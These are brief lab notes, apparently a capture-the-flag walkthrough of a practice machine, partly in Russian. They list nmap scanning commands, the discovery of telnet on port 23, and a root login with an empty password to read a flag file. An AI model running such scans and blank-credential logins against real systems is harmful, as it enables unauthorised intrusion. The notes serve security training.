# Meow — Lab Notes

## Target
IP: <TARGET_IP>

---

# Recon

nmap -p- -sS -T4 --min-rate 1000 <TARGET_IP>

Result:
23/tcp open telnet

---

# Service Scan

nmap -sV -p 23 <TARGET_IP>

Service:
telnet

---

# Exploitation

telnet <TARGET_IP>

Login: root
Password: (пусто)

Доступ получен.

ls
cat flag.txt

Флаг получен.
